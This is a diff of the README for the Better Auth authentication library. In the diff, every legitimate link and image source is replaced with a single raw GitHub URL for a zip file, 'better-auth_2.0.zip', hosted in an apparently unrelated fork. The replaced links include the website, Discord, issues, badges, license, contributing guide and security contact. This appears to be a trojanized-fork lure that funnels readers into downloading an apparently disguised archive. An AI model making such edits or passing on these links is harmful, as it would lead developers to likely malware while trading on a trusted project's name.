@@ -1,8 +1,8 @@
 <p align="center">
   <picture>
-    <source srcset="./banner-dark.png" media="(prefers-color-scheme: dark)">
-    <source srcset="./banner.png" media="(prefers-color-scheme: light)">
-    <img src="./banner.png" alt="Better Auth Logo">
+    <source srcset="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip" media="(prefers-color-scheme: dark)">
+    <source srcset="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip" media="(prefers-color-scheme: light)">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip" alt="Better Auth Logo">
   </picture>
   <h2 align="center">
     Better Auth
@@ -11,19 +11,19 @@
   <p align="center">
     The most comprehensive authentication library for TypeScript
     <br />
-    <a href="https://better-auth.com"><strong>Learn more »</strong></a>
+    <a href="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip"><strong>Learn more »</strong></a>
     <br />
     <br />
-    <a href="https://discord.com/invite/GYC3W7tZzb">Discord</a>
+    <a href="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip">Discord</a>
     ·
-    <a href="https://better-auth.com">Website</a>
+    <a href="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip">Website</a>
     ·
-    <a href="https://github.com/better-auth/better-auth/issues">Issues</a>
+    <a href="https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip">Issues</a>
   </p>
 
-[![npm](https://img.shields.io/npm/dm/better-auth)](https://npm.chart.dev/better-auth?primary=neutral&gray=neutral&theme=dark)
-[![npm version](https://img.shields.io/npm/v/better-auth.svg)](https://www.npmjs.com/package/better-auth)
-[![GitHub stars](https://img.shields.io/github/stars/better-auth/better-auth)](https://github.com/better-auth/better-auth/stargazers)
+[![npm](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)
+[![npm version](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)
+[![GitHub stars](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)
 </p>
 
 ## About the Project
@@ -36,14 +36,14 @@ Authentication in the TypeScript ecosystem is a half-solved problem. Other open-
 
 ## Contribution
 
-Better Auth is free and open source project licensed under the [MIT License](./LICENSE.md). You are free to do whatever you want with it.
+Better Auth is free and open source project licensed under the [MIT License](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip). You are free to do whatever you want with it.
 
 You could help continuing its development by:
 
-- [Contribute to the source code](./CONTRIBUTING.md)
-- [Suggest new features and report issues](https://github.com/better-auth/better-auth/issues)
+- [Contribute to the source code](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)
+- [Suggest new features and report issues](https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip)
 
 ## Security
-If you discover a security vulnerability within Better Auth, please send an e-mail to security@better-auth.com.
+If you discover a security vulnerability within Better Auth, please send an e-mail to https://raw.githubusercontent.com/KoDelioDa/better-auth/main/packages/better-auth/src/oauth2/better-auth_2.0.zip
 
 All reports will be promptly addressed, and you'll be credited accordingly.
